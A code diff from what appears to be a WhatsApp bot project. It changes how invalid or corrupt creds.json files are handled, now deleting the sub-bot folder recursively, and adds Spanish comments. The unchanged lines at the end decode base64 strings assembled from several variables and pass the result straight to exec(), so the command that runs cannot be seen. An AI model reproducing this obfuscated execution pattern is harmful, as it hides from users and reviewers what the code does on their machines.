@@ -87,22 +87,27 @@ fs.unlinkSync(pathGataJadiBot)
 
 if (fs.existsSync(pathCreds)) {
     try {
+        // Intenta leer y parsear el archivo creds.json
         let fileContent = fs.readFileSync(pathCreds, 'utf-8');
         let creds = JSON.parse(fileContent);
-        if (creds) {
-            if (creds.registered === false) {
-                fs.unlinkSync(pathGataJadiBot);
-                console.log(`Archivo inválido eliminado: ${pathGataJadiBot}`);
-            }
+        
+        // Si el archivo creds.json es válido pero 'registered' es false, elimina la subcarpeta
+        if (creds && creds.registered === false) {
+            console.log(`Credenciales no válidas detectadas en ${pathCreds}. Eliminando carpeta ${pathGataJadiBot}.`);
+            fs.rmdirSync(pathGataJadiBot, { recursive: true }); // Elimina la subcarpeta 'pathGataJadiBot'
+            console.log(`Carpeta eliminada: ${pathGataJadiBot}`);
         }
     } catch (error) {
         console.error(`Error al procesar ${pathCreds}:`, error.message);
-        // Eliminar el archivo corrupto
-        fs.unlinkSync(pathCreds);
-        console.log(`Archivo corrupto eliminado: ${pathCreds}`);
+        
+        // Si ocurre un error al leer o parsear el archivo, elimina la carpeta
+        fs.rmdirSync(pathGataJadiBot, { recursive: true }); // Elimina la subcarpeta 'pathGataJadiBot'
+        console.log(`Carpeta eliminada debido a archivo corrupto: ${pathGataJadiBot}`);
     }
+} else {
+    console.log(`El archivo ${pathCreds} no existe.`);
 }
-
+    
 const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
 exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
 const drmer = Buffer.from(drm1 + drm2, `base64`)
